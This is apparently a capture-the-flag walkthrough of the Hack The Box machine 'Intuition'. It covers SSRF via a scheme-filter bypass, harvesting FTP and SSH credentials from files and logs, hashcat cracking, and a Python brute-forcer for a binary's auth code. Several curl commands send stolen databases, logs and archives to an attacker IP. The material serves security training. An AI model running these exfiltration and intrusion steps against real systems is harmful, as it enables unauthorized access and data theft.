import os from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, send_file from werkzeug.utils import secure_filename import lzma app = Flask(__name__) app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 5 * 1024 * 1024 # Limit file size to 5MB UPLOAD_FOLDER = &#39;uploads&#39; ALLOWED_EXTENSIONS = {&#39;txt&#39;, &#39;pdf&#39;, &#39;docx&#39;} #Add more allowed file extensions if needed main_bp = Blueprint(&#39;main_bp&#39;, __name__, template_folder=&#39;./templates/&#39;) def allowed_file(filename): return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS @main_bp.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def index(): if request.method == &#39;POST&#39;: if &#39;file&#39; not in request.files: flash(&#39;No file part&#39;, &#39;error&#39;) return redirect(request.url) file = request.files[&#39;file&#39;] if file.filename == &#39;&#39;: flash(&#39;No selected file&#39;, &#39;error&#39;) return redirect(request.url) if not allowed_file(file.filename): flash(&#39;Invalid file extension. Allowed extensions: txt, pdf, docx&#39;, &#39;error&#39;) return redirect(request.url) if file and allowed_file(file.filename): filename = secure_filename(file.filename) uploaded_file = os.path.join(app.root_path, UPLOAD_FOLDER, filename) file.save(uploaded_file) print(uploaded_file) flash(&#39;File successfully compressed!&#39;, &#39;success&#39;) with open(uploaded_file, &#39;rb&#39;) as f_in: with lzma.open(os.path.join(app.root_path, UPLOAD_FOLDER, f&#34;{filename}.xz&#34;), &#39;wb&#39;) as f_out: f_out.write(f_in.read()) compressed_filename = f&#34;{filename}.xz&#34; file_to_send = os.path.join(app.root_path, UPLOAD_FOLDER, compressed_filename) response = send_file(file_to_send, as_attachment=True, download_name=f&#34;{filename}.xz&#34;, mimetype=&#34;application/x-xz&#34;) os.remove(uploaded_file) os.remove(file_to_send) return response return redirect(url_for(&#39;main_bp.index&#39;)) return render_template(&#39;index/index.html&#39;) report.py:
from flask import Blueprint, render_template, request, flash, url_for, redirect from .report_utils import * from blueprints.auth.auth_utils import deserialize_user_data from blueprints.auth.auth_utils import admin_required, login_required report_bp = Blueprint(&#34;report&#34;, __name__, subdomain=&#34;report&#34;) @report_bp.route(&#34;/&#34;, methods=[&#34;GET&#34;]) def report_index(): return render_template(&#34;report/index.html&#34;) @report_bp.route(&#34;/report_bug&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) @login_required def report_bug(): if request.method == &#34;POST&#34;: user_data = request.cookies.get(&#34;user_data&#34;) user_info = deserialize_user_data(user_data) name = user_info[&#34;username&#34;] report_title = request.form[&#34;report_title&#34;] description = request.form[&#34;description&#34;] if add_report(name, report_title, description): flash( &#34;Bug report submitted successfully! Our team will be checking on this shortly.&#34;, &#34;success&#34;, ) else: flash(&#34;Error occured while trying to add the report!&#34;, &#34;error&#34;) return redirect(url_for(&#34;report.report_bug&#34;)) return render_template(&#34;report/report_bug_form.html&#34;) @report_bp.route(&#34;/list_reports&#34;) @login_required @admin_required def list_reports(): reports = get_all_reports() return render_template(&#34;report/report_list.html&#34;, reports=reports) @report_bp.route(&#34;/report/&#34;) @login_required @admin_required def report_details(report_id): report = get_report_by_id(report_id) print(report) if report: return render_template(&#34;report/report_details.html&#34;, report=report) else: flash(&#34;Report not found!&#34;, &#34;error&#34;) return redirect(url_for(&#34;report.report_index&#34;)) @report_bp.route(&#34;/about_reports&#34;, methods=[&#34;GET&#34;]) def about_reports(): return render_template(&#34;report/about_reports.html&#34;) auth.py:
from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, make_response from .auth_utils import * from werkzeug.security import check_password_hash app = Flask(__name__) auth_bp = Blueprint(&#39;auth&#39;, __name__, subdomain=&#39;auth&#39;) @auth_bp.route(&#39;/&#39;) def index(): return redirect(url_for(&#39;auth.login&#39;)) @auth_bp.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def login(): if request.method == &#39;POST&#39;: username = request.form[&#39;username&#39;] password = request.form[&#39;password&#39;] user = fetch_user_info(username) if (user is None) or not check_password_hash(user[2], password): flash(&#39;Invalid username or password&#39;, &#39;error&#39;) return redirect(url_for(&#39;auth.login&#39;)) serialized_user_data = serialize_user_data(user[0], user[1], user[3]) flash(&#39;Logged in successfully!&#39;, &#39;success&#39;) response = make_response(redirect(get_redirect_url(user[3]))) response.set_cookie(&#39;user_data&#39;, serialized_user_data, domain=&#39;.comprezzor.htb&#39;) return response return render_template(&#39;auth/login.html&#39;) @auth_bp.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def register(): if request.method == &#39;POST&#39;: username = request.form[&#39;username&#39;] password = request.form[&#39;password&#39;] user = fetch_user_info(username) if user is not None: flash(&#39;User already exists&#39;, &#39;error&#39;) return redirect(url_for(&#39;auth.register&#39;)) if create_user(username, password): flash(&#39;Registration successful! You can now log in.&#39;, &#39;success&#39;) return redirect(url_for(&#39;auth.login&#39;)) else: flash(&#39;Unexpected error occured while trying to register!&#39;, &#39;error&#39;) return render_template(&#39;auth/register.html&#39;) @auth_bp.route(&#39;/logout&#39;) def logout(): pass and finally, dashboard.py:
from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data from blueprints.report.report_utils import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report import random, os, pdfkit, socket, shutil import urllib.request from urllib.parse import urlparse import zipfile from ftplib import FTP from datetime import datetime dashboard_bp = Blueprint(&#39;dashboard&#39;, __name__, subdomain=&#39;dashboard&#39;) pdf_report_path = os.path.join(os.path.dirname(__file__), &#39;pdf_reports&#39;) allowed_hostnames = [&#39;report.comprezzor.htb&#39;] @dashboard_bp.route(&#39;/&#39;, methods=[&#39;GET&#39;]) @admin_required def dashboard(): user_data = request.cookies.get(&#39;user_data&#39;) user_info = deserialize_user_data(user_data) if user_info[&#39;role&#39;] == &#39;admin&#39;: reports = get_report_by_priority(1) elif user_info[&#39;role&#39;] == &#39;webdev&#39;: reports = get_all_reports() return render_template(&#39;dashboard/dashboard.html&#39;, reports=reports, user_info=user_info) @dashboard_bp.route(&#39;/report/&#39;, methods=[&#39;GET&#39;]) @login_required def get_report(report_id): user_data = request.cookies.get(&#39;user_data&#39;) user_info = deserialize_user_data(user_data) if user_info[&#39;role&#39;] in [&#39;admin&#39;, &#39;webdev&#39;]: report = get_report_by_id(report_id) return render_template(&#39;dashboard/report.html&#39;, report=report, user_info=user_info) else: pass @dashboard_bp.route(&#39;/delete/&#39;, methods=[&#39;GET&#39;]) @login_required def del_report(report_id): user_data = request.cookies.get(&#39;user_data&#39;) user_info = deserialize_user_data(user_data) if user_info[&#39;role&#39;] in [&#39;admin&#39;, &#39;webdev&#39;]: report = delete_report(report_id) return redirect(url_for(&#39;dashboard.dashboard&#39;)) else: pass @dashboard_bp.route(&#39;/resolve&#39;, methods=[&#39;POST&#39;]) @login_required def resolve(): report_id = int(request.args.get(&#39;report_id&#39;)) if resolve_report(report_id): flash(&#39;Report resolved successfully!&#39;, &#39;success&#39;) else: flash(&#39;Error occurred while trying to resolve!&#39;, &#39;error&#39;) return redirect(url_for(&#39;dashboard.dashboard&#39;)) @dashboard_bp.route(&#39;/change_priority&#39;, methods=[&#39;POST&#39;]) @admin_required def change_priority(): user_data = request.cookies.get(&#39;user_data&#39;) user_info = deserialize_user_data(user_data) if user_info[&#39;role&#39;] != (&#39;webdev&#39; or &#39;admin&#39;): flash(&#39;Not enough permissions. Only admins and webdevs can change report priority.&#39;, &#39;error&#39;) return redirect(url_for(&#39;dashboard.dashboard&#39;)) report_id = int(request.args.get(&#39;report_id&#39;)) priority_level = int(request.args.get(&#39;priority_level&#39;)) if change_report_priority(report_id, priority_level): flash(&#39;Report priority level changed!&#39;, &#39;success&#39;) else: flash(&#39;Error occurred while trying to change the priority!&#39;, &#39;error&#39;) return redirect(url_for(&#39;dashboard.dashboard&#39;)) @dashboard_bp.route(&#39;/create_pdf_report&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) @admin_required def create_pdf_report(): global pdf_report_path if request.method == &#39;POST&#39;: report_url = request.form.get(&#39;report_url&#39;) try: scheme = urlparse(report_url).scheme hostname = urlparse(report_url).netloc try: dissallowed_schemas = [&#34;file&#34;, &#34;ftp&#34;, &#34;ftps&#34;] if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(&#34;:&#34;)[0]) != &#39;127.0.0.1&#39;) or (hostname in allowed_hostnames)): print(scheme) urllib_request = urllib.request.Request(report_url, headers={&#39;Cookie&#39;: &#39;user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM&#39; # SOME CODE WAS LOST HERE BECAUSE THE LINE WAS TOO LONG AND OVERFLOWED THE PDF-WRITER # try: ? response = urllib.request.urlopen(urllib_request) html_content = response.read().decode(&#39;utf-8&#39;) pdf_filename = f&#39;{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf&#39; pdfkit.from_string(html_content, pdf_filename) return send_file(pdf_filename, as_attachment=True) except: flash(&#39;Unexpected error!&#39;, &#39;error&#39;) return render_template(&#39;dashboard/create_pdf_report.html&#39;) else: flash(&#39;Invalid URL&#39;, &#39;error&#39;) return render_template(&#39;dashboard/create_pdf_report.html&#39;) except Exception as e: raise e else: return render_template(&#39;dashboard/create_pdf_report.html&#39;) @dashboard_bp.route(&#39;/backup&#39;, methods=[&#39;GET&#39;]) @admin_required def backup(): source_directory = os.path.abspath(os.path.dirname(__file__) + &#39;../../../&#39;) current_datetime = datetime.now().strftime(&#34;%Y%m%d%H%M%S&#34;) backup_filename = f&#39;app_backup_{current_datetime}.zip&#39; with zipfile.ZipFile(backup_filename, &#39;w&#39;, zipfile.ZIP_DEFLATED) as zipf: for root, _, files in os.walk(source_directory): for file in files: file_path = os.path.join(root, file) arcname = os.path.relpath(file_path, source_directory) zipf.write(file_path, arcname=arcname) try: ftp = FTP(&#39;ftp.local&#39;) ftp.login(user=&#39;ftp_admin&#39;, passwd=&#39;u3jai8y71s2&#39;) ftp.cwd(&#39;/&#39;) with open(backup_filename, &#39;rb&#39;) as file: ftp.storbinary(f&#39;STOR {backup_filename}&#39;, file) ftp.quit() os.remove(backup_filename) flash(&#39;Backup and upload completed successfully!&#39;, &#39;success&#39;) except Exception as e: flash(f&#39;Error: {str(e)}&#39;, &#39;error&#39;) return redirect(url_for(&#39;dashboard.dashboard&#39;)) While it&rsquo;s really cool to see all that source code, I think the particularly interesting part is the backup() function in dashboard.py. First of all, we see right away that we have an FTP credential:
ftp_admin : u3jai8y71s2
Next, we can finally see what that dashboard.comprezzor.htb/backup route is actually doing. If I&rsquo;m understanding this correctly, it will create a .zip archive of the /app/code directory and save it into the FTP server ftp.local as app_backup_20240501HHMMSS.zip where HHMMSS is a 6-digit numeric represenation of the time.
I made a small test environment to check these assumptions:
When running app.py, I get this:
Thankfully, we already have a way to bypass the disallowed_schemas check in create_pdf_report() - by inserting whitespace before the schema of the URL. As such, I should be able to make a backup, then read it as a PDF. Then&hellip; somehow convert that back to a zip file? I&rsquo;m not sure. For now, I&rsquo;ll try to create a backup and fuzz for it.
Fuzzing for the backup &#x1f6ab; This is the wrong way. If you&rsquo;re short on time, please skip this section.
Basically, we know the filename but will need to guess what hour and second it was created at. We need the hour because I&rsquo;m not sure what time zone the target is in. We need the second because clocks aren&rsquo;t perfectly accurate, and could easily drift by a few seconds.
As a starting point, I just made a backup, at 2024-05-01 12:06:17 (plus or minus a few seconds) local time:
Although I said I&rsquo;m not sure what timezone the target is in, we can make a pretty good guess by assuming that their response headers are telling the truth. Here&rsquo;s the response headers (and some body) from the request I made to read /etc/passwd:
HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Wed, 01 May 2024 06:22:57 GMT Content-Type: application/pdf Content-Length: 12207 Connection: keep-alive Content-Disposition: attachment; filename=report_45565.pdf Last-Modified: Wed, 01 May 2024 06:22:56 GMT Cache-Control: no-cache ETag: &#34;1714544576.9961698-12207-2683770363&#34; %PDF-1.4 %Ã¢Ã£ 1 0 obj &lt;&lt; /Title () /Creator (þÿ\x00w\x00k\x00h\x00t\x00m\x00l\x00t\x00o\x00p\x00d\x00f\x00 \x000\x00.\x001\x002\x00.\x006) /Producer (þÿ\x00Q\x00t\x00 \x005\x00.\x001\x005\x00.\x002) /CreationDate (D:20240501062256Z) ... Since both the webserver header and the PDF writer responded with the same timestamp, the target is probably in GMT.
I&rsquo;ll be fuzzing a request for this file, with HH and SS as parameters:
report_url=+ftp%3A%2F%2Fftp_admin%3Au3jai8y71s2%40ftp.local%2Fapp_backup_20240501HH06SS.zip for i in {0..23}; do printf &#34;%02d\\n&#34; $i; done &gt; hours.txt for i in {0..59}; do printf &#34;%02d\\n&#34; $i; done &gt; seconds.txt Using those as wordlists, we can start fuzzing:
ffuf -u http://dashboard.comprezzor.htb/create_pdf_report \\ -x http://127.0.0.1:8080 -X POST -w hours.txt:HH -w seconds.txt:SS \\ -b &#39;user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \\ -d &#39;report_url=+ftp%3A%2F%2Fftp_admin%3Au3jai8y71s2%40ftp.local%2Fapp_backup_20240501HH06SS.zip&#39; \\ -t 40 -c -v -fs 1675 FTP Loot In my earlier fuzzing attempts, I overlooked something. A little bit of research about FTP has informed me that you can actually get the directory listing by requesting the directory path. In this case, the root directory /.
So, let&rsquo;s utilize the same SSRF as before, but this time request the root directory:
We now see that there were no backup files to fuzz for&hellip; But there are some other interesting-looking files:
Here&rsquo;s the contents of welcome_note.txt, some parts omitted for brevity:
Dear Devs, We are &hellip; thrive in your position. To facilitate your work and access to our systems, we have attached an SSH private key to this email. You can use the following passphrase to access it, Y27SH19HDIWD. Please ensure the utmost confidentiality and security &hellip; need further information, please feel free to me at adam@comprezzor.htb. Best regards, Adam
&#x1f389; Wahoo! They just gave us the passphrase for the private key &#x1f601; (Hopefully a key for the user adam?)
Hmm&hellip; Not so lucky. Thankfully, after a bit of research I found a tidy way to find the username associated with a private key if you already know the passphrase for the private key - you can just add it to your ssh agent:
ssh-add loot/private-8297.key And there we go. We now have the username, passphrase, and private key for dev_acc : Y27SH19HDIWD
&#x26a0;&#xfe0f; Remember to delete this key from your ssh agent when you&rsquo;re done with the box:
ssh-add -d loot/private-8297.key Alright, let&rsquo;s attempt to log in with that whole credential:
&#x1f389; Success! The SSH connection drops you into /home/dev_acc, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG Local enumeration: dev_acc I&rsquo;ll follow my usual Linux Local Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
There are three &ldquo;human&rdquo; users on the box: adam, dev_acc and lopez. All three have a home directory.
dev_acc is only owner of their home directory, nothing else.
The target box has the following useful software: nc, netcat, curl, wget, python3, perl, tmux
netstat shows some interesting services listening: By connecting to each with nc, I&rsquo;ve confirmed that ports 4444, 8080 and 35949 are all serving http.
&#x261d;&#xfe0f; The service on port 40999 seems to randomize its port. Every time the box is reset, there is a different port.
I found a nonstandard directory /opt/ftp: This would seem to suggest that there is another FTP user, adam.
The target is running wpa_supplicant, which seems pretty odd. Perhaps just an oversight by the box creator?
Linpeas showed quite a bit of stuff regarding the VNC connection and an XVFB server (like X11, but you don&rsquo;t actually need a screen), however I think these are probably due to the headless browser that checks for XSS payloads.
Pspy Things like pspy need to be ran locally (as far as I know). I&rsquo;ll transfer some of my tools over to the target to make this easier. For this, I&rsquo;ll once again use my tools: simple-http-server. Feel free to just to PHP or http.server instead, but my tool has advantages for data exfiltration.
If I wanted to run pspy without &ldquo;touching disk&rdquo;, I think the way to do it would actually be to download the tool into /dev/shm and run it from there. If I&rsquo;m not mistaken, that would all be in RAM and would not actually touch disk &#x1f914;
This is an example of the geckodriver running to &ldquo;check the bug reports&rdquo; and trip an XSS payload:
I think this is related, but to be honest I&rsquo;m not really sure yet. Note the use of x11vnc and Xvfb:
Here, we can see port mappings from the docker container to the host system - 4444 to 4444, and 80 to 8080:
I was lucky enough to see someone log in as lopez, read some file, then run runner list:
&#x1f609; Maybe a spolier, but I&rsquo;ll take all the help I can get!
This runner thing seems like it might be important:
Port forwarding Next I want to investigate what&rsquo;s running on ports 4444, 8080, and 40999. I&rsquo;ll SSH into the box again, but this time I&rsquo;ll specify some forwarded ports:
&#x261d;&#xfe0f; I frequently use proxies on port 8080, so I mapped that to 9090 instead.
Port 4444 I wasn&rsquo;t too surprised to see this, but it looks like port 4444 is Selenium Grid:
This also explains the x11vnc that we saw earlier - if you click on Sessions there is an option to view a session over VNC.
Just to be thorough, I performed directory enumeration on this port:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://localhost:4444/FUZZ -t 40 -ic -c -v The /ui page is the one shown in the image above. However, /status shows the Selenium Grid status as a long json file (which I saved locally). The most interesting part was the VNC connection details:
Maybe I should try connecting to VNC later, and see what the Selenium driver is looking at? &#x1f6a9;
Port 8080 From the pspy results, we&rsquo;re expecting this one to be the http server from the docker container. Navigating to it yields a 404 Not Found:
I suspect that we&rsquo;re actually looking at comprezzor.htb, so I&rsquo;ll try setting a host header:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST:FUZZ -u http://localhost:9090 -H &#39;Host: FUZZ.comprezzor.htb&#39; -t 40 -ic -c -v Yep, exactly as suspected:
Checking /etc/nginx/sites-available/reverse_proxy confirms that these (plus comprezzor.htb) are the only domains behind the nginx reverse proxy.
Port 40999 This port is a little more mysterious. Navigating to it provides little info:
Whatweb doesn&rsquo;t show anything useful either:
I&rsquo;ll try fuzzing for whatever this is. First, I&rsquo;ll try some vhost fuzzing:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST:FUZZ -u http://localhost:40999 -H &#39;Host: FUZZ.htb&#39; -t 40 -ic -c -v ffuf -w $WLIST:FUZZ -u http://localhost:40999 -H &#39;Host: FUZZ.local&#39; -t 40 -ic -c -v But that didn&rsquo;t turn up any results.
Back to the web app During local enumeration, it&rsquo;s usually a good idea to go back to your entry point and enumerate more thoroughly from an inside perspective. For this box, that means I should search through the files of the web app, in /var/www/app.
Looking around manually a bit, the blueprints/auth subdirectory seems like it has some interesting contents.
Let&rsquo;s upload it to my attacker machine
for F in auth.py auth_utils.py users.db users.sql; do curl -X POST -F &#34;file=@./$F&#34; http://10.10.14.9:8000; done Then on my attacker machine I can freely examine the files. The database contents look like they might be useful:
I&rsquo;ll get to work cracking these hashes after I&rsquo;m done a little more enumeration &#x1f6a9;
The auth_utils.py file contained some code that confirms a suspicion I had about the cookie format that I had mentioned earlier. It also shows exactly how a user is created in the database:
from werkzeug.security import generate_password_hash SECRET_KEY = &#39;JS781FJS07SMSAH27SG&#39; USER_DB_FILE = os.path.join(os.path.dirname(__file__), &#39;users.db&#39;) # ... def create_user(username, password, role=&#39;user&#39;): try: with sqlite3.connect(USER_DB_FILE) as conn: cursor = conn.cursor() cursor.execute(&#39;INSERT INTO users (username, password, role) VALUES (?,?,?)&#39;, (username,generate_password_hash(password,&#39;sha256&#39;), role)) conn.commit() return True except Exception as e: return False def serialize_user_data(user_id, username, role): data = { &#39;user_id&#39;: user_id, &#39;username&#39;: username, &#39;role&#39;: role } serialized_data = json.dumps(data).encode(&#39;utf-8&#39;) signature = hmac.new(SECRET_KEY.encode(&#39;utf-8&#39;), serialized_data, hashlib.sha256).hexdigest() return base64.b64encode(serialized_data + b&#39;|&#39; + signature.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;) # ... That seems to be everything new to learn from the web app. There is also a database for bug reports, blueprints/report/reports.db, but inside is only a single table containing the bug reports we already saw in the web app.
Grepping for credentials As a last step of local enumeration, I like go to each notable directory under / (usually /home, /etc, /var, /opt, sometimes /media, and if I&rsquo;m desparate /usr) and grep for credentials. I do this by running a short bash script:
# for example, start at etc cd /etc # use zgrep if available GREP_PROG=$(which zgrep || which grep) # loop through all &#34;human&#34; users on the box for usr in \`cat /etc/passwd | grep -v nologin | grep -v /bin/false | grep -vE &#39;^sync:&#39; | cut -d &#39;:&#39; -f 1\`; do echo &#34;---------------&#34;; echo &#34;Searching for user: $usr&#34;; # grep with a max depth of 2 and search for username find . -maxdepth 2 -type f -exec $GREP_PROG -nH $usr {} \\; 2&gt;/dev/null; done When I ran this over the /var/log directory, I found something interesting: a mention of the lopez user logging in using FTP:
Sorry for the wide screenshot - my HTB connection is so bad right now that I can hardly use SSH&hellip; so I&rsquo;m documenting this using my terminal history.
I&rsquo;m not sure what this suricata thing is, but it appears to be logging network activity. The image above shows the beginning of an FTP login, logged in eve.json.7.gz. To examine the file further, I uploaded to my attacker http server and unzipped it:
# On the target machine cd suricata F=./eve.json.7.gz; curl -X POST -F &#34;file=@$F&#34; http://10.10.14.9:8000 # On attacker machine mv www/eve.json.7.gz loot/ cd loot gzip -d eve.json.7.gz I saw that each of these log entries has a flow_id on it that is used on possibly multiple entries, so I decided to go with the flow id. Following each occurence of that flow_id, I was able to read the whole history of the FTP transaction with lopez. Fortunately, the next entry contained an FTP password!
&#x1f440; Unfortunately, this was a failed authentication attempt. That&rsquo;s OK - the zgrep results showed two entries, so let&rsquo;s try the other flow_id instead:
&#x1f34d; There we go - a successful authentication. We now have a new FTP credential: lopez : Lopezz1992%123. I&rsquo;ll check for credential re-use after doing the rest of my &ldquo;to-do&rdquo; queue &#x1f6a9;
Cracking the hashes These werkzeug hashes are in a bit of a weird format. Let&rsquo;s check hashcat&rsquo;s modes to see if there&rsquo;s anything applicable:
hashcat --example-hashes | grep -i werkzeug -B 1 -A 18 So to match this format, I put the hashes into a file like this:
Then we let loose the hashcat:
hashcat -m 30120 --username auth.hashes /usr/share/wordlists/rockyou.txt After a few seconds, we have a result:
A little odd that there&rsquo;s a space in the password, but whatever
Great, so we have a credential for the web app dashboard adam : adam gray
&#x274c; I checked this password for SSH authentication as adam - no luck!
During my initial steps at local enumeration, I found the nonstandard directory /opt/ftp with subdirectories ftp_admin and adam - which suggests that adam is also an FTP user. So let&rsquo;s try logging into FTP with this new credential:
It worked! There&rsquo;s a /backup/runner1 directory inside with three files: run-tests.sh, runner1, and runner1.c. I downloaded each of these from FTP then recreated the directory structure and archived it. Then I uploaded the file to my attacker machine.
cd /tmp/.Tools mkdir -p backup/runner1 mv run-tests.sh runner1 runner1.c backup/runner1/ tar -czvf backup.tar.gz ./backup curl -X POST -F &#34;file=@./backup.tar.gz&#34; http://10.10.14.9:8000 Runner1 Back on my attacker machine, I examined the runner1 backup. The run-tests.sh file has some interesting hints:
#!/bin/bash # List playbooks ./runner1 list # Run playbooks [Need authentication] # ./runner run [playbook number] -a [auth code] #./runner1 run 1 -a &#34;UHI75GHI****&#34; # Install roles [Need authentication] # ./runner install [role url] -a [auth code] #./runner1 install http://role.host.tld/role.tar -a &#34;UHI75GHI****&#34; &#x1f914; &ldquo;playbook&rdquo; eh? Makes me think of Ansible.
Also, it looks like we have a partial &ldquo;auth code&rdquo; in the comments. I wonder if there are literally four trailing characters. Given the alphabet of the prefix of that auth code, that only leaves 36 ^ 4 = 1679616 guesses to enumerate the whole thing.
I won&rsquo;t show the whole contents of it here, but the source code for runner.c shows that its purpose is mostly to run ansible playbooks. To do so, we need to authenticate by providing the right auth key. It compares the MD5 hash of the provided auth code with a hardcoded MD5 hash and checks for a match.
The program has two calls to system that might be vulnerable if I can figure out a way to provide the right inputs.
But how will I obtain the right auth key? If we can assume the comments in run-tests.sh are accurate, then there are 4 characters to guess. I wrote a short program to try guessing two characters, and it only took 1-2s to run, so then to do the same thing with 4 characters should take only half an hour, roughly.
Here is the program I made for cracking the auth key (I&rsquo;ve left out the parts of main that are just boilerplate multiprocessing code):
#!/usr/bin/python3 import subprocess import itertools import multiprocessing import string alphabet = string.ascii_uppercase + string.digits prefix = &#39;UHI75GHI&#39; num_letters = 4 failure = b&#39;Error: Authentication failed.\\n&#39; def worker(start, end, result_queue): # Get all combinations of the alphabet that are num_letters long combinations = itertools.product(alphabet, repeat=num_letters) # This worker should only process its portion of the whole set of combinations combinations_slice = itertools.islice(combinations, start, end) # Transform the combinations (tuples of letters) into joined strings result = list(map(lambda t: &#39;&#39;.join(t), list(combinations_slice))) # Run the binary for every combination that that this worker should process for letters in result: # Start a subprocess using the known prefix + letters r = subprocess.run([&#34;/home/kali/Box_Notes/Intuition/loot/backup/runner1/runner1&#34;, &#34;list&#34;, &#34;-a&#34;, prefix+letters], capture_output=True) # If the stdout of the result doesn&#39;t match the failure string, we cracked it! if r.stdout != failure: print(prefix+letters) result_queue.put(prefix+letters) def main(): # Establish a queue for results # Create a pool of 4 processes, each one gets a worker # I&#39;m using a 4-core CPU. If you have more, increase the number of processes. # Print all entries of the result_queue if __name__ == &#34;__main__&#34;: main() I started the program and went to make some tea. After a few minutes, I returned to find a result:
&#x1f44f; To verify, I tried running runner1 using this UHI75GHINKOP and it does actually work:
I know this looks like it&rsquo;s failing, but that&rsquo;s just because I&rsquo;m testing locally on my attacker machine. If authentication failed, it would have said &ldquo;Error: Authentication failed&rdquo; instead - so this is actually a positive result.
Lopez credential reuse I&rsquo;ll try using that credential for lopez to try logging into other services, like SSH. Again, the credential was lopez : Lopezz1992%123:
&#x1f389; Awesome! We now have access to lopez.
Local enumeration: lopez Note in the image from the previous section that lopez is also in the sys-adm group. I know I&rsquo;ve seen that before, but I can&rsquo;t recall exactly where. Let&rsquo;s search the filesystem for directories that group owns:
Ah, right - it was those two directories in /opt. These are clearly related to the runner1 program that we found inside the backup directory we found in the FTP server as adam.
Since we actually have a password for this user, one of the first things I like to do is to check what they can sudo:
&#x1f639; Alright, this is clearly the privesc vector.
Partly because my connection is quite bad, partly because it&rsquo;s convenient, I&rsquo;m going to transfer these two directories in /opt back to my attacker machine for further analysis:
I had to reset my VPN, so I have a new IP address now
tar -czvf /tmp/.Tools/playbooks.tar.gz F=./runner2; curl -X POST -F &#34;file=@$F&#34; http://10.10.14.17:8000 F=/tmp/.Tools/playbooks.tar.gz; curl -X POST -F &#34;file=@$F&#34; http://10.10.14.17:8000 Playbooks The /opt/playbooks directory contains only two files, apt_update.yml and inventory.ini. apt_update is definitely an ansible playbook:
--- - name: Update and Upgrade APT Packages test hosts: local become: yes tasks: - name: Update APT Cache apt: update_cache: yes when: ansible_distribution == &#39;Debian&#39; or ansible_distribution == &#39;Ubuntu&#39; - name: Upgrade APT Packages apt: upgrade: dist update_cache: yes when: ansible_distribution == &#39;Debian&#39; or ansible_distribution == &#39;Ubuntu&#39; And inventory.ini hints at some very juicy items:
[local] 127.0.0.1 127.0.0.1 ansible_ssh_user=root ansible_ssh_private_key_file=/root/keys/private.key [docker_web_servers] 172.21.0.2 I wonder if it would be possible to run the ansible playbook, and intercept the SSH key&hellip; kind of a MITM attack? &#x1f914;
Runner2 Analysis At first glance, runner2 is definitely a little different than runner1:
Maybe we can get it to divulge some more info by feeding it a valid json file:
curl http://10.10.14.17:8000/test.json -o /tmp/.Tools/test.json sudo /opt/runner2/runner2 /tmp/.Tools/test.json The program shows a message: &ldquo;Run key missing or invalid.&rdquo;.
Alright, time to put my reverse engineering hardhat on and dive in&hellip; I&rsquo;ll use BinaryNinja.
Honestly, taking a quick look at main() reveals that this program is pretty sane. They haven&rsquo;t really tried to obfuscate anything, which is nice. The program begins with this:
checking if args were provided testing if the argument is a json file checking that it parses as valid json checking that the json contains an auth key checking that the json contains an action When I ran it earlier using test.json, my run failed at the check at line 14:
data_2148 is a pointer to the string literal &ldquo;run&rdquo;; rax_16 is a pointer to the action in the json file.
By the way, json_object_get is a library call from the JSON-C library.
I&rsquo;m going to keep drilling down the json structure, figuring out what labels it expects at each level of the json &ldquo;tree&rdquo;.
&#x261d;&#xfe0f; Whenever I figure out what should be where, I&rsquo;ll rename the variable - so if subsequent images in this guide show different variable names, it&rsquo;s because that&rsquo;s the reverse engineering process! I&rsquo;ll be renaming variables as [something]_key or [something]_val if it seems like its part of the json structure.
If you&rsquo;re following along with this guide, reference line numbers instead of variable names to keep yourself oriented.
check_auth function A quick comparison of the check_auth function in runner2 to the auth mechanism in runner1 shows that (thank goodness) they use the same MD5 hash:
That means that I won&rsquo;t need to repeat the exercise of brute-forcing the hash &#x1f44f;
Main code branches I see three main branches for the program flow:
The &ldquo;run&rdquo; branch seems to be the most promising for privilege escalation. We already saw from /opt/playbooks/apt_update.yml that we can initiate privileged actions using an ansible playbook, so why not get it to pop us a shell or make an SUID bash or something?
list action The list action is very simple. It does not require an auth_code and simply lists out the playbooks.
run action Shown below is the first part of the &ldquo;run&rdquo; branch. Basically, it checks the auth_code. If we&rsquo;re authorized, then it starts reading the /opt/playbooks directory:
This part confuses me&hellip; the value of run.num must be 3? What&rsquo;s the point of that?
From there, it starts looping through the /opt/playbooks directory. For each entry that is dtype = DT_REG (is a normal file) and contains the substring .yml. It keeps looping until the index of the file (starting at 1 and incrementing after checking the file) matches the run.num value from the json file.
&#x1f4a1; Ohh&hellip; Now I understand. We have to choose run.num = 3 because of the index of the directory entries:
